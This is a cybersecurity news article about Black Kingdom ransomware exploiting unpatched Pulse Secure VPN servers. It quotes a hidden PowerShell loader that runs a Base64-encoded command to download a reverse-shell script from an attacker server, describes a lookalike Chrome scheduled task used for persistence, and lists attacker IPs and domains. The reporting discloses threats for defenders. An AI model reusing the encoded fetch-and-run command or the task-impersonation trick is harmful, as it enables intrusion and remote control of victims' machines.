Companies delayed updating their software\n[even after exploits became public, prompting multiple alerts from the U.S. government and](https://www.bleepingcomputer.com/news/security/us-govt-warns-of-attacks-on-unpatched-pulse-vpn-servers/)\n[threat actors started leveraging it; some organizations continue to run a vulnerable version of](https://doublepulsar.com/big-game-ransomware-being-delivered-to-organisations-via-pulse-secure-vpn-bd01b791aad9)\nthe product.\n\nREDTEAM.PL, a company offering cybersecurity services based in Poland, observed that\nBlack Kingdom operators used the same doorway provided by Pulse Secure VPN to breach\nwhat they believed was a target.\n\n\n-----\n\nFrom the researchers observations, the ransomware established persistence by\nimpersonating a legitimate scheduled task for Google Chrome, with a single letter making the\ndifference:\n```\nGoogleUpdateTaskMachineUSA - Black Kingdom task\nGoogleUpdateTaskMachineUA - legitimate Google Chrome task\n\n```\nAccording to [REDTEAM.PL’s analysis, the scheduled task runs a Base64-encoded string](https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html)\ncode in a hidden PowerShell window to fetch a script named “reverse.ps1” that is likely used\nto open a reverse shell on the compromised host.\n```\ncversions_cache.ps1 script:\n$update =\n\"SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvA\npowershell.exe -exec bypass -nologo -Enc $update\n\n```\n[Adam Ziaja of REDTEAM.PL told BleepingComputer that the script could not be retrieved](https://twitter.com/adamziaja)\nfrom the remote server controlled by the attacker, probably because the server hosting it was\nblocked before the payload could be delivered.\n\nThe IP address where “reverse.ps1” resided is 198.13.49.179, which is managed by Choopa,\na child company of Vultr, well known for the cheap virtual private servers (VPS) it provides\nand for being used by cybercriminals to host their malicious tools.\n\nIt resolves to three domains, the third one being connected to other servers in the U.S. and\nItaly hosting Android and cryptocurrency mining malware.\n\nhost.cutestboty.com\nkeepass.cutestboty.com\nanno1119.com\n\n\n-----\n\n## Recent appearance\n\nBlack Kingdom ransomware was first spotted in late February by security\n[researcher GrujaRS, who found that it appended the .DEMON extension to encrypted files.](https://twitter.com/GrujaRS)\n\n[The sample analyzed (1,](https://www.youtube.com/watch?v=ZA6wX2FOW08) [2) contacted the same IP address found in REDTEAM.PL’s report.](https://any.run/report/63d6c419a8229bc7fc2089a2899d27bac746de0e96368e2a49d7c7754abd29f4/649fff18-14f5-4544-8d04-0a981d2e0c79#files)\nIt dropped the following ransom note asking for $10,000 to be deposited to a bitcoin wallet\nand threatening that failing to do so would lead to the data to be destroyed or sold.\n\n\n-----\n\nChecking the bitcoin address provided by the attacker shows an empty balance and two\nincoming transactions totaling 0.55BTC, converted to $5,200 at the moment of writing.\n\n## Related Articles:\n\n[The Week in Ransomware - May 20th 2022 - Another one bites the dust](https://www.bleepingcomputer.com/news/security/the-week-in-ransomware-may-20th-2022-another-one-bites-the-dust/)\n\n[The Week in Ransomware - May 6th 2022 - An evolving landscape](https://www.bleepingcomputer.com/news/security/the-week-in-ransomware-may-6th-2022-an-evolving-landscape/)\n\n[Magniber ransomware gang now exploits Internet Explorer flaws in attacks](https://www.bleepingcomputer.com/news/security/magniber-ransomware-gang-now-exploits-internet-explorer-flaws-in-attacks/)\n\n[Microsoft finds severe bugs in Android apps from large mobile providers](https://www.bleepingcomputer.com/news/security/microsoft-finds-severe-bugs-in-android-apps-from-large-mobile-providers/)\n\n[BlackCat/ALPHV ransomware asks $5 million to unlock Austrian state](https://www.bleepingcomputer.com/news/security/blackcat-alphv-ransomware-asks-5-million-to-unlock-austrian-state/)\n\n[Ionut Ilascu](https://www.bleepingcomputer.com/author/ionut-ilascu/)\n\nIonut Ilascu is a technology writer with a focus on all things cybersecurity.
